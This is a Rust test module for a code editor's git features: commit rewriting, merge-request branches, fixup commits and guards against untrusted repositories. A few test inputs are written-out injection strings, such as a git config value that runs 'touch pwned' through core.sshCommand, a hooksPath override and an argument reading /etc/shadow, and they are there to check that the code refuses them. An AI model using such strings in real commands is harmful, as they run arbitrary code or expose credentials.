        assert!(
            rewrite_cleanup_commands("zed-rewrite/abc1234", "zed-rewrite/abc1234").is_err(),
            "the branch to return to may not be the one being deleted"
        );
        rewrite_range_commands("base", &[], "newest", "main", "main")
            .expect_err("a rewrite may not be built on a branch it would then delete");
    }

    /// The probes for ignored files a rewrite would overwrite: every path the rewritten commits
    /// touch, listed with `-z`, and only those paths handed to `ls-files`, literally and from the
    /// top, in commands short enough for Windows; all of them allowed by `run_command`.
    #[test]
    fn test_ignored_file_probes_only_ask_about_the_touched_paths() {
        let log = |revisions: &[&str]| {
            ["log", "--format=", "--name-only", "--no-renames", "-z"]
                .iter()
                .chain(revisions)
                .map(|argument| argument.to_string())
                .collect::<Vec<_>>()
        };
        assert_eq!(
            touched_paths_probe_commands(RewrittenCommits::Range("abc..HEAD")),
            vec![log(&["abc..HEAD"])]
        );
        let shas = (0..TOUCHED_PATHS_PROBE_COMMITS + 1)
            .map(|index| format!("{index:040x}"))
            .collect::<Vec<_>>();
        let commands = touched_paths_probe_commands(RewrittenCommits::Commits(&shas));
        assert_eq!(commands.len(), 2, "one `log` per chunk of commits");
        assert_eq!(
            commands[1],
            log(&["--no-walk", shas[TOUCHED_PATHS_PROBE_COMMITS].as_str()])
        );
        assert_eq!(
            commands
                .iter()
                .flat_map(|command| command.iter().skip(6))
                .collect::<Vec<_>>(),
            shas.iter().collect::<Vec<_>>(),
            "every commit, in order, each once"
        );

        assert_eq!(
            parse_nul_separated_paths("a.txt\0日本 語/b\nc.txt\0\0.env\0").collect::<Vec<_>>(),
            vec!["a.txt", "日本 語/b\nc.txt", ".env"]
        );

        assert!(ignored_files_probe_commands(std::iter::empty()).is_empty());
        assert_eq!(
            ignored_files_probe_commands([".env", "-x/[a]*.txt"]),
            vec![
                [
                    "ls-files",
                    "--others",
                    "--ignored",
                    "--exclude-standard",
                    "-z",
                    "--",
                    ":(top,literal).env",
                    ":(top,literal)-x/[a]*.txt",
                ]
                .map(str::to_string)
                .to_vec()
            ]
        );
        let many = (0..2_000)
            .map(|index| format!("some/deep/directory/file-{index}.txt"))
            .collect::<Vec<_>>();
        let commands = ignored_files_probe_commands(many.iter().map(String::as_str));
        assert!(commands.len() > 1, "a long list is split");
        for command in &commands {
            let length = command
                .iter()
                .map(|argument| argument.len() + 1)
                .sum::<usize>();
            assert!(length < 32_767 / 2, "command line of {length} characters");
            validate_git_command(command).expect("the probe must be allowed");
        }
        assert_eq!(
            commands
                .iter()
                .flat_map(|command| command.iter().skip(6))
                .map(|pathspec| pathspec.trim_start_matches(":(top,literal)"))
                .collect::<Vec<_>>(),
            many.iter().map(String::as_str).collect::<Vec<_>>(),
            "every path, in order, each once"
        );
        for command in touched_paths_probe_commands(RewrittenCommits::Commits(&shas)) {
            validate_git_command(&command).expect("the probe must be allowed");
        }
    }

    #[test]
    fn test_ignored_files_refusal_names_at_most_five_files() {
        assert_eq!(ignored_files_refusal(&[]), None);
        assert_eq!(
            ignored_files_refusal(&[".env".to_string()]).as_deref(),
            Some(
                "Stopped because the ignored local files .env would be overwritten and lost during the rewrite. Move them somewhere else and try again."
            )
        );
        let files = (1..=7).map(|index| format!("f{index}")).collect::<Vec<_>>();
        let refusal = ignored_files_refusal(&files).unwrap();
        assert!(
            refusal.starts_with(
                "Stopped because the ignored local files f1, f2, f3, f4, f5 and 2 more would be"
            ),
            "{refusal}"
        );
        assert!(!refusal.contains("f6"), "{refusal}");

        let _locale = i18n::test_support::LocaleOverride::new(Some(
            i18n_catalog::test_support::bundled_catalog("ja"),
        ));
        assert_eq!(
            ignored_files_refusal(&[".env".to_string()]).as_deref(),
            Some(
                "無視されているローカルのファイル .env が、書き換えの途中で上書きされて失われるため中止しました。別の場所に退避してからやり直してください。"
            )
        );
        assert!(
            ignored_files_refusal(&files)
                .unwrap()
                .starts_with("無視されているローカルのファイル f1、f2、f3、f4、f5 ほか 2 個が、"),
        );
    }

    /// A catalog that translates every message into `translation`, as a catalog in the user's
    /// configuration directory, which is not trusted, can.
    struct EverythingCatalog {
        translation: &'static str,
    }

    impl i18n::Catalog for EverythingCatalog {
        fn locale(&self) -> &str {
            "xx"
        }
        fn lookup(&self, _context: Option<&str>, _msgid: &str) -> Option<&'static str> {
            Some(self.translation)
        }
        fn lookup_plural(
            &self,
            _context: Option<&str>,
            _msgid: &str,
            _msgid_plural: &str,
            _count: u64,
        ) -> Option<&'static str> {
            None
        }
    }

    fn catalog_translating_everything_into(translation: &str) -> &'static EverythingCatalog {
        Box::leak(Box::new(EverythingCatalog {
            translation: Box::leak(translation.to_string().into_boxed_str()),
        }))
    }

    /// Translations that would give the key a section or a value, would not reach git as one
    /// argument, would be no key at all, or look like an option, each with whether git is still
    /// given it to quote.
    fn hostile_translations() -> Vec<(String, bool)> {
        vec![
            (".".to_string(), false),
            ("section.name".to_string(), false),
            ("core.hooksPath".to_string(), false),
            ("=".to_string(), false),
            ("x=y".to_string(), false),
            ("core.sshCommand=touch pwned".to_string(), false),
            (String::new(), false),
            (" \n\t".to_string(), false),
            ("nul\0inside".to_string(), false),
            ("x".repeat(40_000), false),
            ("line one\nline two".to_string(), true),
            ("spaces and\ttabs".to_string(), true),
            ("'single' \"double\" `back`".to_string(), true),
            ("-".to_string(), true),
            ("--version".to_string(), true),
        ]
    }

    #[test]
    fn test_untrusted_refusals_always_end_with_the_english_key() {
        for refusal in [
            UNTRUSTED_FILTERS_NOT_DISABLED,
            UNTRUSTED_REMOTE_PROGRAMS_REFUSED,
        ] {
            assert!(!refusal.contains(['.', '=']), "{refusal:?}");
            assert_eq!(refusal_config_args(refusal), ["-c", refusal]);

            {
                let _japanese = i18n::test_support::LocaleOverride::new(Some(
                    i18n_catalog::test_support::bundled_catalog("ja"),
                ));
                let translated = i18n::tr(refusal);
                assert_ne!(translated, refusal, "the refusal is translated");
                assert_eq!(
                    refusal_config_args(refusal),
                    ["-c", translated, "-c", refusal],
                    "git quotes the first key, so the translation goes first"
                );
            }

            for (translation, passed_on) in hostile_translations() {
                let _hostile = i18n::test_support::LocaleOverride::new(Some(
                    catalog_translating_everything_into(&translation),
                ));
                let expected = if passed_on {
                    vec!["-c", translation.as_str(), "-c", refusal]
                } else {
                    vec!["-c", refusal]
                };
                assert_eq!(refusal_config_args(refusal), expected, "{translation:?}");
            }
        }
    }

    /// Only the refusal of the subcommand itself counts as an older server not knowing it.
    #[test]
    fn test_is_unknown_git_subcommand_refusal() {
        let refused = format!(
            "{:#}",
            validate_git_command(&["frobnicate".to_string()]).unwrap_err()
        );
        assert!(is_unknown_git_subcommand_refusal(&refused, "frobnicate"));
        assert!(is_unknown_git_subcommand_refusal(
            "RPC failed: unsupported git command: ls-files
",
            "ls-files"
        ));
        assert!(!is_unknown_git_subcommand_refusal(
            "unsupported git command: ls-files-extra",
            "ls-files"
        ));
        assert!(!is_unknown_git_subcommand_refusal(
            "unsupported git command argument: --exclude-from=/etc/shadow",
            "ls-files"
        ));
        assert!(!is_unknown_git_subcommand_refusal(
            "unsupported git command: log",
            "ls-files"
        ));
    }

    /// The options that keep an untrusted repository's diff programs from running follow the
    /// subcommand, never the arguments after it.
    #[test]
    fn test_untrusted_subcommand_guards() {
        assert_eq!(
            untrusted_subcommand_guards(OsStr::new("diff")),
            [
                "--no-ext-diff",
                "--no-textconv",
                "--ignore-submodules=dirty"
            ]
        );
        for subcommand in ["log", "show"] {
            assert_eq!(
                untrusted_subcommand_guards(OsStr::new(subcommand)),
                ["--no-ext-diff", "--no-textconv"]
            );
        }
        assert_eq!(
            untrusted_subcommand_guards(OsStr::new("status")),
            ["--ignore-submodules=dirty"]
        );
        assert_eq!(
            untrusted_subcommand_guards(OsStr::new("blame")),
            ["--no-textconv"]
        );
        for subcommand in ["hash-object", "format-patch", "ls-files", "rebase"] {
            assert!(untrusted_subcommand_guards(OsStr::new(subcommand)).is_empty());
        }
    }

    /// The merge-request build shares the rewrite namespace, so that the git panel's banner can
    /// take the user back from it, while staying recognizable as a merge-request build.
    #[test]
    fn test_merge_request_scratch_branch_name() {
        let scratch = merge_request_scratch_branch_name("abcdef0123456789abcdef0123456789abcdef01");
        assert_eq!(scratch, "zed-rewrite/mr-abcdef0");
        assert!(is_rewrite_scratch_branch(&scratch));
        assert!(is_merge_request_scratch_branch(&scratch));
        assert!(!is_merge_request_scratch_branch("zed-rewrite/abcdef0"));
        assert!(!is_merge_request_scratch_branch("zed-rewrite/mr-"));
        assert!(!is_merge_request_scratch_branch("mr-abcdef0"));
    }

    #[test]
    fn test_validate_merge_request_branch_name() {
        validate_merge_request_branch_name("mr/feature").unwrap();
        validate_merge_request_branch_name("mr/日本語").unwrap();
        validate_merge_request_branch_name("mr/v1.2-fix_a@b").unwrap();
        for refused in [
            "",
            "   ",
            "-D",
            "--force",
            "mr/two words",
            "mr/\tfeature",
            "HEAD",
            "@",
            "zed-rewrite/mr-abc",
            "refs/heads/main",
            "mr/a..b",
            "mr/a@{1}",
            "mr/a~1",
            "mr/a^",
            "mr:a",
            "mr/a?",
            "mr/*",
            "mr/[a]",
            "mr\\a",
            "/mr",
            "mr/",
            "mr//a",
            "mr/a.",
            "mr/.hidden",
            "mr/a.lock",
            "mr/\u{7f}",
        ] {
            assert!(
                validate_merge_request_branch_name(refused).is_err(),
                "`{refused}` must be refused"
            );
        }
    }

    #[test]
    fn test_merge_request_branch_is_never_the_default_branch() {
        let refusal = ensure_merge_request_branch_is_not_default("main", Some("main"))
            .expect_err("the default branch may not be the merge-request branch");
        assert!(refusal.to_string().contains("default branch"), "{refusal}");
        ensure_merge_request_branch_is_not_default("mr/main", Some("main")).unwrap();
        ensure_merge_request_branch_is_not_default("main", None).unwrap();
    }

    /// A new merge-request branch: the scratch branch at the base, the commits replayed onto it
    /// oldest first, folded into one commit, the branch created there, and the user put back.
    #[test]
    fn test_merge_request_commands_for_a_new_branch() {
        let scratch = "zed-rewrite/mr-ccccccc";
        let picks = merge_request_pick_commands(
            "base0000",
            &["aaa".to_string(), "bbb".to_string(), "ccc".to_string()],
            scratch,
        )
        .unwrap();
        assert_eq!(
            picks
                .iter()
                .map(|command| command.join(" "))
                .collect::<Vec<_>>(),
            vec![
                "switch --no-overwrite-ignore -c zed-rewrite/mr-ccccccc base0000".to_string(),
                "cherry-pick --keep-redundant-commits aaa bbb ccc".to_string(),
            ]
        );
        for command in &picks {
            validate_git_command(command).unwrap();
        }

        let finish =
            merge_request_finish_commands("base0000", "MR の本文", "mr/dev", false, "dev", scratch)
                .unwrap();
        assert_eq!(
            finish
                .fold_and_point
                .iter()
                .map(|command| command.join(" "))
                .collect::<Vec<_>>(),
            vec![
                "reset --soft base0000".to_string(),
                "commit -m MR の本文".to_string(),
                "branch mr/dev HEAD".to_string(),
            ]
        );
        assert_eq!(
            finish.return_to_origin,
            rewrite_cleanup_commands("dev", scratch).unwrap()
        );
        for command in finish.fold_and_point.iter().chain(&finish.return_to_origin) {
            validate_git_command(command).unwrap();
        }
    }

    /// Recreating moves the existing branch with `branch -f`; a message that looks like an option
    /// still travels as one argument after `-m`.
    #[test]
    fn test_merge_request_commands_for_a_recreated_branch() {
        let finish = merge_request_finish_commands(
            "base0000",
            "--amend",
            "mr/dev",
            true,
            "dev",
            "zed-rewrite/mr-ccccccc",
        )
        .unwrap();
        assert_eq!(
            finish.fold_and_point,
            vec![
                vec![
                    "reset".to_string(),
                    "--soft".to_string(),
                    "base0000".to_string()
                ],
                vec![
                    "commit".to_string(),
                    "-m".to_string(),
                    "--amend".to_string()
                ],
                vec![
                    "branch".to_string(),
                    "-f".to_string(),
                    "mr/dev".to_string(),
                    "HEAD".to_string()
                ],
            ]
        );
        for command in &finish.fold_and_point {
            validate_git_command(command).unwrap();
        }
    }

    /// Everything the build would move is checked before anything runs: the branch the user
    /// started from can never be the one `branch -f` moves, and nothing outside the scratch
    /// namespace is built on (and later deleted).
    #[test]
    fn test_merge_request_commands_refuse_what_they_cannot_undo() {
        let scratch = "zed-rewrite/mr-ccccccc";
        assert!(
            merge_request_finish_commands("base", "m", "dev", true, "dev", scratch).is_err(),
            "the branch the user started from may not be moved"
        );
        assert!(
            merge_request_finish_commands("base", "  ", "mr/dev", false, "dev", scratch).is_err()
        );
        assert!(merge_request_finish_commands("base", "m", "-D", false, "dev", scratch).is_err());
        assert!(merge_request_finish_commands("", "m", "mr/dev", false, "dev", scratch).is_err());
        assert!(
            merge_request_finish_commands("base", "m", "mr/dev", false, "dev", "zed-rewrite/abc")
                .is_err(),
            "a rewrite's scratch branch is not a merge-request build's"
        );
        assert!(
            merge_request_finish_commands("base", "m", "mr/dev", false, "dev", "feature").is_err()
        );
        assert!(merge_request_pick_commands("base", &[], scratch).is_err());
        assert!(merge_request_pick_commands("base", &["-x".to_string()], scratch).is_err());
        assert!(merge_request_pick_commands("base", &["aaa".to_string()], "main").is_err());
    }

    #[gpui::test]
    async fn test_merge_request_commands_on_installed_git(cx: &mut TestAppContext) {
        check_merge_request_commands(installed_git_version(), cx).await;
    }

    /// The commands run against a real git: the branch ends up one commit on top of the base
    /// carrying exactly the picked changes, even when one of them is already in the base.
    async fn check_merge_request_commands(version: GitVersion, cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let repo_dir = temp_dir.path().join("repo");
        git_init_repo(&repo_dir);
        let commit = |name: &str, contents: &str| {
            fs::write(repo_dir.join(format!("{name}.txt")), contents).unwrap();
            git_command(&repo_dir, ["add", "."]);
            git_command(&repo_dir, ["commit", "-m", name]);
            git_command_output(&repo_dir, ["rev-parse", "HEAD"])
        };
        commit("initial", "initial\n");
        git_command(&repo_dir, ["checkout", "-b", "dev"]);
        let first = commit("A", "A\n");
        commit("left-out", "left out\n");
        let already_in_base = commit("shared", "shared\n");
        let last = commit("C", "C\n");
        git_command(&repo_dir, ["checkout", "main"]);
        let base = commit("shared", "shared\n");
        git_command(&repo_dir, ["checkout", "dev"]);

        let scratch = merge_request_scratch_branch_name(&last);
        let shas = vec![first, already_in_base, last];
        let picks = merge_request_pick_commands(&base, &shas, &scratch).unwrap();
        let finish =
            merge_request_finish_commands(&base, "MR にまとめる", "mr/dev", false, "dev", &scratch)
                .unwrap();
        for command in picks
            .into_iter()
            .chain(finish.fold_and_point)
            .chain(finish.return_to_origin)
        {
            let adapted = adapt_command_to_git_version(command, Some(version));
            git_command(&repo_dir, &adapted.args);
        }

        assert_eq!(
            git_command_output(&repo_dir, ["rev-parse", "--abbrev-ref", "HEAD"]),
            "dev"
        );
        assert_eq!(
            git_command_output(&repo_dir, ["rev-parse", "mr/dev^"]),
            base,
            "the merge request is a single commit on top of the base"
        );
        assert_eq!(
            git_command_output(&repo_dir, ["log", "-1", "--format=%s", "mr/dev"]),
            "MR にまとめる"
        );
        assert_eq!(
            git_command_output(&repo_dir, ["diff", "--name-only", &base, "mr/dev"]),
            "A.txt\nC.txt"
        );
        assert!(
            git_command_output(&repo_dir, ["branch", "--list", &scratch]).is_empty(),
            "the scratch branch should have been deleted"
        );
    }

    fn joined(commands: &[Vec<String>]) -> Vec<String> {
        commands.iter().map(|args| args.join(" ")).collect()
    }

    /// Each kind of change a fixup can fold in, as the commands that record it, and every one of
    /// them has to get past the checks `run_command` makes on the far side of an SSH connection.
    #[test]
    fn test_fixup_commit_commands_record_exactly_the_chosen_changes() {
        let staged = fixup_commit_commands("abc", &FixupChanges::Staged, &[]).unwrap();
        assert_eq!(joined(&staged), vec!["commit --fixup=abc".to_string()]);

        let all = fixup_commit_commands("abc", &FixupChanges::AllTracked, &[]).unwrap();
        assert_eq!(joined(&all), vec!["commit --fixup=abc -a".to_string()]);

        // `*`, `[` and a leading `-` are all spelled out literally: a glob would pull in files
        // nobody picked, and a bare `-x` would be read as an option.
        let paths = vec![
            repo_path("src/a[1].rs"),
            repo_path("-x.txt"),
            repo_path("docs/new.md"),
        ];
        let picked = fixup_commit_commands(
            "abc",
            &FixupChanges::Paths(paths.clone()),
            &[repo_path("docs/new.md")],
        )
        .unwrap();
        assert_eq!(
            joined(&picked),
            vec![
                "add -- :(literal)docs/new.md".to_string(),
                "commit --fixup=abc --only -- :(literal)src/a[1].rs :(literal)-x.txt :(literal)docs/new.md"
                    .to_string(),
            ]
        );

        // Only the untracked files are added: `add` refuses a path whose deletion is already
        // staged, which `commit --only` records by itself.
        let tracked_only = fixup_commit_commands("abc", &FixupChanges::Paths(paths), &[]).unwrap();
        assert_eq!(tracked_only.len(), 1);
        assert_eq!(tracked_only[0][0], "commit");

        for args in staged.iter().chain(&all).chain(&picked) {
            validate_git_command(args)
                .unwrap_or_else(|error| panic!("{args:?} must be allowed: {error:#}"));
        }

        assert!(
            fixup_commit_commands("abc", &FixupChanges::Paths(Vec::new()), &[]).is_err(),
            "a fixup of no files has nothing to record"
        );
        assert!(fixup_commit_commands("", &FixupChanges::Staged, &[]).is_err());
    }

    /// The files added for a refused commit go back to being untracked, and nothing else is
    /// touched.
    #[test]
    fn test_fixup_unstage_args_only_name_the_added_files() {
        assert_eq!(fixup_unstage_args(&[]), None);
        let args = fixup_unstage_args(&[repo_path("docs/new[1].md")]).unwrap();
        assert_eq!(args.join(" "), "reset -q -- :(literal)docs/new[1].md");
        validate_git_command(&args).unwrap();
    }

    /// `-i` with nobody editing the todo list, and `--root` for the repository's first commit,
    /// which has no parent to start from.
    #[test]
    fn test_fixup_rebase_args() {
        assert_eq!(
            fixup_rebase_args(Some("parent")).join(" "),
            "rebase -i --autosquash --autostash --keep-empty parent"
        );
        assert_eq!(
            fixup_rebase_args(None).join(" "),
            "rebase -i --autosquash --autostash --keep-empty --root"
        );
        for args in [fixup_rebase_args(Some("parent")), fixup_rebase_args(None)] {
            validate_git_command(&args)
                .unwrap_or_else(|error| panic!("{args:?} must be allowed: {error:#}"));
        }

        // A git without `--autostash` keeps everything else and refuses a dirty worktree instead.
        let old = adapt_command_to_git_version(
            fixup_rebase_args(Some("parent")),
            Some(GitVersion::new(2, 5, 0)),
        );
        assert_eq!(
            old.args.join(" "),
            "rebase -i --autosquash --keep-empty parent"
        );
        assert!(old.dropped_autostash);
    }

    #[test]
    fn test_fixup_changes_probe_args() {
        assert_eq!(
            fixup_changes_probe_args(&FixupChanges::Staged).join(" "),
            "diff --cached --name-only"
        );
        assert_eq!(
            fixup_changes_probe_args(&FixupChanges::AllTracked).join(" "),
            "diff HEAD --name-only"
        );
        let probe = fixup_changes_probe_args(&FixupChanges::Paths(vec![repo_path("a*.rs")]));
        assert_eq!(probe.join(" "), "diff HEAD --name-only -- :(literal)a*.rs");
        validate_git_command(&probe).unwrap();
    }

    /// Exactly the prefixes `rebase --autosquash` acts on, space included.
    #[test]
    fn test_is_autosquash_subject() {
        for subject in [
            "fixup! first",
            "squash! first",
            "amend! first",
            "fixup! fixup! a",
        ] {
            assert!(is_autosquash_subject(subject), "{subject}");
        }
        for subject in [
            "first",
            "fixup!first",
            "Fixup! first",
            "a fixup! b",
            "fixup!",
        ] {
            assert!(!is_autosquash_subject(subject), "{subject}");
        }
    }

    /// Empty output means the upstream already has the commit; no upstream at all (git refuses
    /// `@{upstream}`) counts as not pushed.
    #[test]
    fn test_is_pushed_from_probe() {
        assert_eq!(
            pushed_probe_args("abc").join(" "),
            "log --format=%H -1 @{upstream}..abc"
        );
        validate_git_command(&pushed_probe_args("abc")).unwrap();

        let output = |stdout: &str, exit_code: i32| GitCommandOutput {
            stdout: stdout.to_string(),
            stderr: String::new(),
            exit_code: Some(exit_code),
        };
        assert!(is_pushed_from_probe(&output("", 0)));
        assert!(is_pushed_from_probe(&output("\n", 0)));
        assert!(!is_pushed_from_probe(&output("abc\n", 0)));
        let no_upstream = GitCommandOutput {
            stdout: String::new(),
            stderr: "fatal: no upstream configured for branch 'main'".to_string(),
            exit_code: Some(128),
        };
        assert!(!is_pushed_from_probe(&no_upstream));
        assert!(
            !has_upstream_from_probe(&no_upstream),
            "not pushed for want of an upstream is told apart"
        );
        assert!(has_upstream_from_probe(&output("", 0)));
        assert!(has_upstream_from_probe(&output("abc\n", 0)));
    }

    /// A commit the rebase dropped for having become empty is not a `fixup!` left standing.
    #[test]
    fn test_fixup_left_unfolded() {
        assert!(!fixup_left_unfolded("later\nfirst\n"));
        assert!(
            !fixup_left_unfolded("first\n"),
            "one commit fewer, none left over"
        );
        assert!(!fixup_left_unfolded(""));
        assert!(fixup_left_unfolded("fixup! first\nlater\nfirst\n"));
        assert!(fixup_left_unfolded("later\nsquash! first\nfirst"));
    }

    #[gpui::test]
    async fn test_rewrite_range_on_installed_git(cx: &mut TestAppContext) {
        check_rewrite_range(installed_git_version(), cx).await;
    }

    /// The plan the todo editor builds, run against a real git: commits reordered, folded and
    /// dropped, with the commit after the range replayed on top of the result.
    async fn check_rewrite_range(version: GitVersion, cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let repo_dir = temp_dir.path().join("repo");
        git_init_repo(&repo_dir);
        let commit = |name: &str| {
            fs::write(repo_dir.join(format!("{name}.txt")), format!("{name}\n")).unwrap();
            git_command(&repo_dir, ["add", "."]);
            git_command(&repo_dir, ["commit", "-m", name]);
            git_command_output(&repo_dir, ["rev-parse", "HEAD"])
        };
        let base = commit("initial");
        let first = commit("A");
        let second = commit("B");
        let third = commit("C");
        let last = commit("D");
        commit("E");

        // C moves ahead of A, B is folded into A, and D is left out entirely.
        let groups = vec![
            RewriteGroup {
                shas: vec![third],
                message: None,
            },
            RewriteGroup {
                shas: vec![first, second],
                message: Some("A と B".to_string()),
            },
        ];
        let scratch = rewrite_scratch_branch_name(&last);
        let commands = rewrite_range_commands(&base, &groups, &last, "main", &scratch).unwrap();
        for command in commands {
            let adapted = adapt_command_to_git_version(command.args, Some(version));
            git_command(&repo_dir, &adapted.args);
        }

        assert_eq!(
            git_command_output(&repo_dir, ["log", "--format=%s"])
                .lines()
                .map(str::to_string)
                .collect::<Vec<_>>(),
            ["E", "A と B", "C", "initial"]
        );
        for present in ["A", "B", "C", "E"] {
            assert!(
                repo_dir.join(format!("{present}.txt")).exists(),
                "{present}.txt should have survived the rewrite"
            );
        }
        assert!(
            !repo_dir.join("D.txt").exists(),
            "the dropped commit's file should be gone"
        );
        assert!(
            git_command_output(&repo_dir, ["branch", "--list", &scratch]).is_empty(),
            "the scratch branch should have been deleted"
        );
        assert_eq!(
            git_command_output(&repo_dir, ["rev-parse", "--abbrev-ref", "HEAD"]),
            "main"
        );
    }
}
